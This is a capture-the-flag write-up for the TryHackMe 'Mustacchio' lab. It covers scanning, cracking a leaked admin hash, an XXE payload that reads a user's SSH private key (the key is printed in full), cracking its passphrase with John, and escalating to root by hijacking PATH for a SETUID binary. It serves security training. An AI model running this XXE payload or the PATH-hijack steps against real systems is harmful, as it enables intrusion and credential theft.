# Mustacchio
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine.

Tags
--
* Fuzzing
* SQLite3

Tools used
--
* nmap
* sqlite3

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.8.16.123

Victim:
* Name: victim_machine
* IP Address: 10.10.130.191
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.130.191 -p- -T5 -vvv

<SNIP>
PORT     STATE  SERVICE REASON         VERSION
22/tcp   closed ssh     reset ttl 63
80/tcp   closed http    reset ttl 63
8765/tcp open   http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```
Phase 2: Foothold
--
Let's try to fuzz on the web application. According our fuzzing, we found a `custom` directory containing `users.bak` file. This file is a SQLite3 file so we can download it and open it by:
```
sqlite3 users.bak
.dump
```
and we get:
```
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
COMMIT;
```
Decode this password hash and we get `bulldog19`. We can use this credential for accessing to `http://10.10.130.191:8765` Admin Panel.

Once accessed to Admin Panel, let's use Burp for intercepting the website response. We can note that, when we submit a comment, om the HTTP response we see two interesting strings:
```
//document.cookie = "Example=/auth/dontforget.bak";
```
and
```
<!-- Barry, you can now SSH in using your key!-->
```
We can access to `http://10.10.130.191:8765/auth/dontforget.bak` and download this file. It contains the following text:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
Try to use this XML code above on the "Add comment" section and submit it. Remember to delete all spaces and characters at the end of XML code after `</comment>`. We can use the following payload on the comment section of the website:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE com [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
<com>&xxe;</com>
</comment>
```
and we get on the website the following output (take the output by HTTP history of Burp because formatted well):
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```
Store it in a file named `id_rsa` and then run:
```
ssh -i id_rsa barry@10.10.130.191
```
It will ask for a passphrase. Let's crack it by John:
```
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=$ROCKYOU

urieljames       (id_rsa)
```
Now we can access by SSH by using this password and get the user flag.

Phase 3: Privilege Escalation
--
By searching for SETUID files by `find / -perm -u=s -type f 2>/dev/null`, we note `/home/joe/live_log` file. By using `strings` command, we note that it has:
```
tail -f /var/log/nginx/access.log
```
We can use `PATH` environment variable for getting root shell. Let's create a file `/tmp/tail` with the following content:
```
/bin/sh
```
and assign executable permissions by `chmod +x /tmp/tail`. Then, run:
```
export PATH=/tmp:$PATH
```
Run `/home/joe/live_log` and you will get the root shell.
